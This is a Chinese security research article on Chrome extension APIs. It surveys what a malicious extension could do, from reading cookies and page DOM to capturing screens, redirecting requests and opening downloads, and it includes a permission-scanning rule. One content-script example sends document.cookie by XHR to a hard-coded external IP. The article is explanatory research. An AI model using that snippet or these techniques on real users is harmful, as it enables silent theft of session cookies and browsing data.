> 原文链接: https://www.anquanke.com//post/id/194405 


# 从0开始入门Chrome Ext安全（二）——安全的Chrome Ext


                                阅读量   
                                **1330176**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01d167f302936761b3.jpg)](https://p2.ssl.qhimg.com/t01d167f302936761b3.jpg)



作者：LoRexxar’@知道创宇404实验室

在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge Dev浏览器，并提供了兼容Chrome Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。

在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从0开始入门Chrome Ext安全》就会从最基础的插件开发开始，逐步研究插件本身的恶意安全问题，恶意网页如何利用插件漏洞攻击浏览器等各种视角下的安全问题。
- [从0开始入门Chrome Ext安全（一） — 了解一个Chrome Ext](https://paper.seebug.org/1082/)
上篇我们主要聊了关于最基础插件开发，之后我们就要探讨关于Chrome Ext的安全性问题了，这篇文章我们主要围绕Chrome Ext的api开始，探讨在插件层面到底能对浏览器进行多少种操作。



## 从一个测试页面开始

为了探讨插件的功能权限范围，首先我们设置一个简单的页面

```
&lt;?php
setcookie('secret_cookie', 'secret_cookie', time()+3600*24);
?&gt;

test pages
```

接下来我们将围绕Chrome ext api的功能探讨各种可能存在的安全问题以及攻击层面。



## Chrome ext js

### content-script

content-script是插件的核心功能代码地方，一般来说，主要的js代码都会出现在content-script中。

它的引入方式在上一篇文章中提到过，要在manfest.json中设置

```
"content_scripts": [
   `{`
     "matches": ["http://*.nytimes.com/*"],
     "css": ["myStyles.css"],
     "js": ["contentScript.js"]
   `}`
 ],
```
- [https://developer.chrome.com/extensions/content_scripts](https://developer.chrome.com/extensions/content_scripts)
而content_script js 主要的特点在于他与页面同时加载，可以访问dom，并且也能调用extension、runtime等部分api，但并不多，主要用于和页面的交互。

content_script js可以通过设置run_at来设置相对应脚本加载的时机。
- document_idle 为默认值，一般来说会在页面dom加载完成之后，window.onload事件触发之前
- document_start 为css加载之后，构造页面dom之前
- document_end 则为dom完成之后，图片等资源加载之前
并且，content_script js还允许通过设置all_frames来使得content_script js作用于页面内的所有frame，这个配置默认为关闭，因为这本身是个不安全的配置，这个问题会在后面提到。

在content_script js中可以直接访问以下Chrome Ext api：
- i18n
- storage
<li>runtime:
<ul>
- connect
- getManifest
- getURL
- id
- onConnect
- onMessage
- sendMessage
在了解完基本的配置后，我们就来看看content_script js可以对页面造成什么样的安全问题。

**安全问题**

对于content_script js来说，首当其中的一个问题就是，插件可以获取页面的dom，换言之，插件可以操作页面内的所有dom，其中就包括非httponly的cookie.

这里我们简单把content_script js中写入下面的代码

```
console.log(document.cookie);
console.log(document.documentElement.outerHTML);
var xhr = new XMLHttpRequest();
xhr.open("get", "http://212.129.137.248?a="+document.cookie, false);
xhr.send()
```

然后加载插件之后刷新页面

[![](https://p5.ssl.qhimg.com/t0158de1feef2be517b.png)](https://p5.ssl.qhimg.com/t0158de1feef2be517b.png)

可以看到成功获取到了页面内dom的信息，并且如果我们通过xhr跨域传出消息之后，我们在后台也成功收到了这个请求。

[![](https://p4.ssl.qhimg.com/dm/1024_58_/t01df51285f6884c2fb.png)](https://p4.ssl.qhimg.com/dm/1024_58_/t01df51285f6884c2fb.png)

这也就意味着，如果插件作者在插件中恶意修改dom，甚至获取dom值传出都可以通过浏览器使用者无感的方式进行。

在整个浏览器的插件体系内，各个层面都存在着这个问题，其中content_script js、injected script js和devtools js都可以直接访问操作dom，而popup js和background js都可以通过chrome.tabs.executeScript来动态执行js，同样可以执行js修改dom。

除了前面的问题以外，事实上content_script js能访问到的chrome api非常之少，也涉及不到什么安全性，这里暂且不提。

### popup/background js

popup js和backround js两个主要的区别在于加载的时机，由于他们不能访问dom，所以这两部分的js在浏览器中主要依靠事件驱动。

其中的主要区别是，background js在事件触发之后会持续执行，而且在关闭所有可见视图和端口之前不会结束。值得注意的是，页面打开、点击拓展按钮都连接着相应的事件，而不会直接影响插件的加载。

而除此之外，这两部分js最重要的特性在于，他们可以调用大部分的chrome ext api，在后面我们将一起探索一下各种api。

### devtools js

devtools js在插件体系中是一个比较特别的体系，如果我们一般把F12叫做开发者工具的话，那devtools js就是开发者工具的开发者工具。

权限和域限制大体上和content js 一致，而唯一特别的是他可以操作3个特殊的api：
- chrome.devtools.panels：面板相关；
- chrome.devtools.inspectedWindow：获取被审查窗口的有关信息；
- chrome.devtools.network：获取有关网络请求的信息；
而这三个api也主要是用于修改F12和获取信息的，其他的就不赘述了。



## Chrome Ext Api

### chrome.cookies

chrome.cookies api需要给与域权限以及cookies权限，在manfest.json中这样定义：

```
`{`
        "name": "My extension",
        ...
        "permissions": [
          "cookies",
          "*://*.google.com"
        ],
        ...
      `}`
```

当申请这样的权限之后，我们可以通过调用chrome.cookies去获取google.com域下的所有cookie.

其中一共包含5个方法
<li>get ? chrome.cookies.get(object details, function callback)<br>
获取符合条件的cookie</li>
<li>getAll ? chrome.cookies.getAll(object details, function callback)<br>
获取符合条件的所有cookie</li>
<li>set ? chrome.cookies.set(object details, function callback)<br>
设置cookie</li>
<li>remove ? chrome.cookies.remove(object details, function callback)<br>
删除cookie</li>
<li>getAllCookieStores ? chrome.cookies.getAllCookieStores(function callback)<br>
列出所有储存的cookie</li>
和一个事件
<li>chrome.cookies.onChanged.addListener(function callback)<br>
当cookie删除或者更改导致的事件</li>
当插件拥有cookie权限时，他们可以读写所有浏览器存储的cookie.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_523_/t01ac1e21f6fdcd0e61.png)

### chrome.contentSettings

chrome.contentSettings api 用来设置浏览器在访问某个网页时的基础设置，其中包括cookie、js、插件等很多在访问网页时生效的配置。

在manifest中需要申请contentSettings的权限

```
`{`
    "name": "My extension",
    ...
    "permissions": [
      "contentSettings"
    ],
    ...
  `}`
```

在content.Setting的api中，方法主要用于修改设置

```
- ResourceIdentifier
- Scope
- ContentSetting
- CookiesContentSetting
- ImagesContentSetting
- JavascriptContentSetting
- LocationContentSetting
- PluginsContentSetting
- PopupsContentSetting
- NotificationsContentSetting
- FullscreenContentSetting
- MouselockContentSetting
- MicrophoneContentSetting
- CameraContentSetting
- PpapiBrokerContentSetting
- MultipleAutomaticDownloadsContentSetting
```

因为没有涉及到太重要的api，这里就暂时不提

### chrome.desktopCapture

chrome.desktopCapture可以被用来对整个屏幕，浏览器或者某个页面截图（实时）。

在manifest中需要申请desktopCapture的权限，并且浏览器提供了获取媒体流的一个方法。
- chooseDesktopMedia ? integer chrome.desktopCapture.chooseDesktopMedia(array of DesktopCaptureSourceType sources, tabs.Tab targetTab, function callback)
- cancelChooseDesktopMedia ? chrome.desktopCapture.cancelChooseDesktopMedia(integer desktopMediaRequestId)
其中DesktopCaptureSourceType被设置为”screen”, “window”, “tab”, or “audio”的列表。

获取到相应截图之后，该方法会将相对应的媒体流id传给回调函数，这个id可以通过getUserMedia这个api来生成相应的id，这个新创建的streamid只能使用一次并且会在几秒后过期。

这里用一个简单的demo来示范

```
function gotStream(stream) `{`
  console.log("Received local stream");
  var video = document.querySelector("video");
  video.src = URL.createObjectURL(stream);
  localstream = stream;
  stream.onended = function() `{` console.log("Ended"); `}`;
`}`

chrome.desktopCapture.chooseDesktopMedia(
["screen"], function (id) `{`
    navigator.webkitGetUserMedia(`{`
        audio: false,
        video: `{`
            mandatory: `{`
                chromeMediaSource: "desktop",
                chromeMediaSourceId: id
            `}`
        `}`
    `}`, gotStream);
`}`
`}`);
```

这里获取的是一个实时的视频流

[![](https://p1.ssl.qhimg.com/dm/1024_297_/t0134c2b08a0f23706f.png)](https://p1.ssl.qhimg.com/dm/1024_297_/t0134c2b08a0f23706f.png)

### chrome.pageCapture

chrome.pageCapture的大致逻辑和desktopCapture比较像，在manifest需要申请pageCapture的权限

```
`{`
    "name": "My extension",
    ...
    "permissions": [
      "pageCapture"
    ],
    ...
  `}`
```

它也只支持saveasMHTML一种方法
- saveAsMHTML ? chrome.pageCapture.saveAsMHTML(object details, function callback)
通过调用这个方法可以获取当前浏览器任意tab下的页面源码，并保存为blob格式的对象。

唯一的问题在于需要先知道tabid

[![](https://p5.ssl.qhimg.com/dm/1024_214_/t019d2bf2db10295cb8.png)](https://p5.ssl.qhimg.com/dm/1024_214_/t019d2bf2db10295cb8.png)

### chrome.tabCapture

chrome.tabCapture和chrome.desktopCapture类似，其主要功能区别在于，tabCapture可以捕获标签页的视频和音频，比desktopCapture来说要更加针对。

同样的需要提前声明tabCapture权限。

主要方法有
- capture ? chrome.tabCapture.capture( CaptureOptions options, function callback)
- getCapturedTabs ? chrome.tabCapture.getCapturedTabs(function callback)
- captureOffscreenTab ? chrome.tabCapture.captureOffscreenTab(string startUrl, CaptureOptions options, function callback)
- getMediaStreamId ? chrome.tabCapture.getMediaStreamId(object options, function callback)
这里就不细讲了，大部分api都是用来捕获媒体流的，进一步使用就和desktopCapture中提到的使用方法相差不大。

### chrome.webRequest

chrome.webRequest主要用户观察和分析流量，并且允许在运行过程中拦截、阻止或修改请求。

在manifest中这个api除了需要webRequest以外，还有有相应域的权限，比如*://*.*:*，而且要注意的是如果是需要拦截请求还需要webRequestBlocking的权限

```
`{`
        "name": "My extension",
        ...
        "permissions": [
          "webRequest",
          "*://*.google.com/"
        ],
        ...
      `}`
```
- [https://developer.chrome.com/extensions/webRequest](https://developer.chrome.com/extensions/webRequest)
在具体了解这个api之前，首先我们必须了解一次请求在浏览器层面的流程，以及相应的事件触发。

[![](https://p0.ssl.qhimg.com/t01ede3d4ab7ea9f210.png)](https://p0.ssl.qhimg.com/t01ede3d4ab7ea9f210.png)

在浏览器插件的世界里，相应的事件触发被划分为多个层级，每个层级逐一执行处理。

由于这个api下的接口太多，这里拿其中的一个举例子

```
chrome.webRequest.onBeforeRequest.addListener(
    function(details) `{`
      return `{`cancel: details.url.indexOf("://www.baidu.com/") != -1`}`;
    `}`,
    `{`urls: ["&lt;all_urls&gt;"]`}`,
    ["blocking"]);
```

当访问baidu的时候，请求会被block

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_678_/t01a1c8a0f6bc7a5a0e.png)

当设置了redirectUrl时会产生相应的跳转

```
chrome.webRequest.onBeforeRequest.addListener(
    function(details) `{`
        if(details.url.indexOf("://www.baidu.com/") != -1)`{`
            return `{`redirectUrl: "https://lorexxar.cn"`}`;
        `}`
    `}`,
    `{`urls: ["&lt;all_urls&gt;"]`}`,
    ["blocking"]);
```

此时访问[www.baidu.com](www.baidu.com)会跳转lorexxar.cn

在文档中提到，通过这些api可以直接修改post提交的内容。

### chrome.bookmarks

chrome.bookmarks是用来操作chrome收藏夹栏的api，可以用于获取、修改、创建收藏夹内容。

在manifest中需要申请bookmarks权限。

当我们使用这个api时，不但可以获取所有的收藏列表，还可以静默修改收藏对应的链接。

[![](https://p2.ssl.qhimg.com/dm/952_1024_/t01e201c1b54538ab6e.png)](https://p2.ssl.qhimg.com/dm/952_1024_/t01e201c1b54538ab6e.png)

[![](https://p5.ssl.qhimg.com/t0127ae6d8bc371e2e2.png)](https://p5.ssl.qhimg.com/t0127ae6d8bc371e2e2.png)

### chrome.downloads

chrome.downloads是用来操作chrome中下载文件相关的api，可以创建下载，继续、取消、暂停，甚至可以打开下载文件的目录或打开下载的文件。

这个api在manifest中需要申请downloads权限，如果想要打开下载的文件，还需要申请downloads.open权限。

```
`{`
    "name": "My extension",
    ...
    "permissions": [
      "downloads",
      "downloads.open"
    ],
    ...
  `}`
```

在这个api下，提供了许多相关的方法
- download ? chrome.downloads.download(object options, function callback)
- search ? chrome.downloads.search(object query, function callback)
- pause ? chrome.downloads.pause(integer downloadId, function callback)
- resume ? chrome.downloads.resume(integer downloadId, function callback)
- cancel ? chrome.downloads.cancel(integer downloadId, function callback)
- getFileIcon ? chrome.downloads.getFileIcon(integer downloadId, object options, function callback)
- open ? chrome.downloads.open(integer downloadId)
- show ? chrome.downloads.show(integer downloadId)
- showDefaultFolder ? chrome.downloads.showDefaultFolder()
- erase ? chrome.downloads.erase(object query, function callback)
- removeFile ? chrome.downloads.removeFile(integer downloadId, function callback)
- acceptDanger ? chrome.downloads.acceptDanger(integer downloadId, function callback)
- setShelfEnabled ? chrome.downloads.setShelfEnabled(boolean enabled)
当我们拥有相应的权限时，我们可以直接创建新的下载，如果是危险后缀，比如.exe等会弹出一个相应的危险提示。

[![](https://p2.ssl.qhimg.com/dm/1024_379_/t01606153efa7b6752f.png)](https://p2.ssl.qhimg.com/dm/1024_379_/t01606153efa7b6752f.png)

除了在下载过程中可以暂停、取消等方法，还可以通过show打开文件所在目录或者open直接打开文件。

但除了需要额外的open权限以外，还会弹出一次提示框。

[![](https://p0.ssl.qhimg.com/t01f5ac379b48bd2ca4.png)](https://p0.ssl.qhimg.com/t01f5ac379b48bd2ca4.png)

相应的其实可以下载file:///C:/Windows/System32/calc.exe并执行，只不过在下载和执行的时候会有专门的危险提示。

反之来说，如果我们下载的是一个标识为非危险的文件，那么我们就可以静默下载并且打开文件。

### chrome.history &amp;&amp; chrome.sessions

chrome.history 是用来操作历史纪录的api，和我们常见的浏览器历史记录的区别就是，这个api只能获取这次打开浏览器中的历史纪律，而且要注意的是，只有关闭的网站才会算进历史记录中。

这个api在manfiest中要申请history权限。

```
`{`
    "name": "My extension",
    ...
    "permissions": [
      "history"
    ],
    ...
  `}`
```

api下的所有方法如下，主要围绕增删改查来
- search ? chrome.history.search(object query, function callback)
- getVisits ? chrome.history.getVisits(object details, function callback)
- addUrl ? chrome.history.addUrl(object details, function callback)
- deleteUrl ? chrome.history.deleteUrl(object details, function callback)
- deleteRange ? chrome.history.deleteRange(object range, function callback)
- deleteAll ? chrome.history.deleteAll(function callback)
浏览器可以获取这次打开浏览器之后所有的历史纪录。

[![](https://p0.ssl.qhimg.com/dm/1024_316_/t01a81a11d6f86389ec.png)](https://p0.ssl.qhimg.com/dm/1024_316_/t01a81a11d6f86389ec.png)

在chrome的api中，有一个api和这个类似-chrome.sessions

这个api是用来操作和回复浏览器会话的，同样需要申请sessions权限。
- getRecentlyClosed ? chrome.sessions.getRecentlyClosed( Filter filter, function callback)
- getDevices ? chrome.sessions.getDevices( Filter filter, function callback)
- restore ? chrome.sessions.restore(string sessionId, function callback)
通过这个api可以获取最近关闭的标签会话，还可以恢复。

[![](https://p2.ssl.qhimg.com/dm/1024_709_/t014c7e8e193db21612.png)](https://p2.ssl.qhimg.com/dm/1024_709_/t014c7e8e193db21612.png)

### chrome.tabs

chrome.tabs是用于操作标签页的api，算是所有api中比较重要的一个api，其中有很多特殊的操作，除了可以控制标签页以外，也可以在标签页内执行js，改变css。

无需声明任何权限就可以调用tabs中的大多出api，但是如果需要修改tab的url等属性，则需要tabs权限，除此之外，想要在tab中执行js和修改css，还需要activeTab权限才行。
- get ? chrome.tabs.get(integer tabId, function callback)
- getCurrent ? chrome.tabs.getCurrent(function callback)
- connect ? runtime.Port chrome.tabs.connect(integer tabId, object connectInfo)
- sendRequest ? chrome.tabs.sendRequest(integer tabId, any request, function responseCallback)
- sendMessage ? chrome.tabs.sendMessage(integer tabId, any message, object options, function responseCallback)
- getSelected ? chrome.tabs.getSelected(integer windowId, function callback)
- getAllInWindow ? chrome.tabs.getAllInWindow(integer windowId, function callback)
- create ? chrome.tabs.create(object createProperties, function callback)
- duplicate ? chrome.tabs.duplicate(integer tabId, function callback)
- query ? chrome.tabs.query(object queryInfo, function callback)
- highlight ? chrome.tabs.highlight(object highlightInfo, function callback)
- update ? chrome.tabs.update(integer tabId, object updateProperties, function callback)
- move ? chrome.tabs.move(integer or array of integer tabIds, object – moveProperties, function callback)
- reload ? chrome.tabs.reload(integer tabId, object reloadProperties, function callback)
- remove ? chrome.tabs.remove(integer or array of integer tabIds, function callback)
- detectLanguage ? chrome.tabs.detectLanguage(integer tabId, function callback)
- captureVisibleTab ? chrome.tabs.captureVisibleTab(integer windowId, object options, function callback)
- executeScript ? chrome.tabs.executeScript(integer tabId, object details, function callback)
- insertCSS ? chrome.tabs.insertCSS(integer tabId, object details, function callback)
- setZoom ? chrome.tabs.setZoom(integer tabId, double zoomFactor, function callback)
- getZoom ? chrome.tabs.getZoom(integer tabId, function callback)
- setZoomSettings ? chrome.tabs.setZoomSettings(integer tabId, ZoomSettings zoomSettings, function callback)
- getZoomSettings ? chrome.tabs.getZoomSettings(integer tabId, function callback)
- discard ? chrome.tabs.discard(integer tabId, function callback)
- goForward ? chrome.tabs.goForward(integer tabId, function callback)
- goBack ? chrome.tabs.goBack(integer tabId, function callback)
一个比较简单的例子，如果获取到tab，我们可以通过update静默跳转tab。

[![](https://p3.ssl.qhimg.com/dm/1024_418_/t01d05ff915c4e5c5ec.png)](https://p3.ssl.qhimg.com/dm/1024_418_/t01d05ff915c4e5c5ec.png)

同样的，除了可以控制任意tab的链接以外，我们还可以新建、移动、复制，高亮标签页。

当我们拥有activeTab权限时，我们还可以使用captureVisibleTab来截取当前页面，并转化为data数据流。

[![](https://p5.ssl.qhimg.com/dm/1024_472_/t01e72b4de490312cd3.png)](https://p5.ssl.qhimg.com/dm/1024_472_/t01e72b4de490312cd3.png)

同样我们可以用executeScript来执行js代码，这也是popup和当前页面一般沟通的主要方式。

[![](https://p3.ssl.qhimg.com/dm/1024_508_/t01398f94a9debbdccb.png)](https://p3.ssl.qhimg.com/dm/1024_508_/t01398f94a9debbdccb.png)

这里我主要整理了一些和敏感信息相关的API，对于插件的安全问题讨论也将主要围绕这些API来讨论。



## chrome 插件权限体系

在了解基本的API之后，我们必须了解一下chrome 插件的权限体系，在跟着阅读前面相关api的部分之后，不难发现，chrome其实对自身的插件体系又非常严格的分割，但也许正是因为这样，对于插件开发者来说，可能需要申请太多的权限用于插件。

所以为了省事，chrome还给出了第二种权限声明方式，就是基于域的权限体系。

在权限申请中，可以申请诸如：
- “http://*/*”,
- “https://*/*”
- “*://*/*”,
- “http://*/”,
- “https://*/”,
这样针对具体域的权限申请方式，还支持&lt;all_urls&gt;直接替代所有。

在后来的权限体系中，Chrome新增了activeTab来替代&lt;all_urls&gt;，在声明了activeTab之后，浏览器会赋予插件操作当前活跃选项卡的操作权限，且不会声明具体的权限要求。
<li>当没有activeTab[![](https://p5.ssl.qhimg.com/t013d335efff6a38e61.png)](https://p5.ssl.qhimg.com/t013d335efff6a38e61.png)
</li>
<li>当申请activeTab后[![](https://p1.ssl.qhimg.com/t0162e9dda879cb08a6.png)](https://p1.ssl.qhimg.com/t0162e9dda879cb08a6.png)
</li>
当activeTab权限被声明之后，无需任何其他权限就可以执行以下操作：
- 调用tabs.executeScript 和 tabs.insertCSS
- 通过tabs.Tab对象获取页面的各种信息
- 获取webRequest需要的域权限
换言之，当插件申请到activeTab权限时，哪怕获取不到浏览器信息，也能任意操作浏览的标签页。

更何况，对于大多数插件使用者，他们根本不关心插件申请了什么权限，所以插件开发者即便申请需要权限也不会影响使用，在这种理念下，安全问题就诞生了。

[![](https://p5.ssl.qhimg.com/t0179c71d4381a30314.png)](https://p5.ssl.qhimg.com/t0179c71d4381a30314.png)



## 真实世界中的数据

经过粗略统计，现在公开在chrome商店的chrome ext超过40000，还不包括私下传播的浏览器插件。

为了能够尽量真实的反映真实世界中的影响，这里我们随机选取1200个chrome插件，并从这部分的插件中获取一些结果。值得注意的是，下面提到的权限并不一定代表插件不安全，只是当插件获取这样的权限时，它就有能力完成不安 全的操作。

这里我们使用Cobra-W新增的Chrome ext扫描功能对我们选取的1200个目标进行扫描分析。

[https://github.com/LoRexxar/Cobra-W](https://github.com/LoRexxar/Cobra-W)

```
python3 cobra.py -t '..\chrome_target\' -r 4104 -lan chromeext -d
```



## &lt;all-url&gt;

当插件获取到&lt;all-url&gt;或者*://*/*等类似的权限之后，插件可以操作所有打开的标签页，可以静默执行任意js、css代码。

我们可以用以下规则来扫描：

```
class CVI_4104:
    """
    rule for chrome crx

    """

    def __init__(self):
        self.svid = 4104
        self.language = "chromeext"
        self.author = "LoRexxar"
        self.vulnerability = "Manifest.json permissions 要求权限过大"
        self.description = "Manifest.json permissions 要求权限过大"

        # status
        self.status = True

        # 部分配置
        self.match_mode = "special-crx-keyword-match"
        self.keyword = "permissions"
        self.match = [
            "http://*/*",
            "https://*/*",
            "*://*/*",
            "&lt;all_urls&gt;",
            "http://*/",
            "https://*/",
            "activeTab",
        ]

        self.match = list(map(re.escape, self.match))
        self.unmatch = []

        self.vul_function = None

    def main(self, regex_string):
        """
        regex string input
        :regex_string: regex match string
        :return:
        """
        pass
```

在我们随机挑选的1200个插件中，共585个插件申请了相关的权限。

[![](https://p0.ssl.qhimg.com/t011f3a66a4c7edc74b.png)](https://p0.ssl.qhimg.com/t011f3a66a4c7edc74b.png)

其中大部分插件都申请了相对范围较广的覆盖范围。

### 其他

然后我们主要扫描部分在前面提到过的敏感api权限，涉及到相关的权限的插件数量如下：

[![](https://p0.ssl.qhimg.com/t01396a3b5091a7c6b8.png)](https://p0.ssl.qhimg.com/t01396a3b5091a7c6b8.png)



## 后记

在翻阅了chrome相关的文档之后，我们不难发现，作为浏览器中相对独立的一层，插件可以轻松的操作相对下层的会话层，同时也可以在获取一定的权限之后，读取一些更上层例如操作系统的信息…

而且最麻烦的是，现代在使用浏览器的同时，很少会在意浏览器插件的安全性，而事实上，chrome商店也只能在一定程度上检测插件的安全性，但是却没办法完全验证，换言之，如果你安装了一个恶意插件，也没有任何人能为你的浏览器负责…安全问题也就真实的影响着各个浏览器的使用者。



## ref
- [https://developer.chrome.com/extensions/devguide](https://developer.chrome.com/extensions/devguide)
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)

本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：[https://paper.seebug.org/1092/](https://paper.seebug.org/1092/)
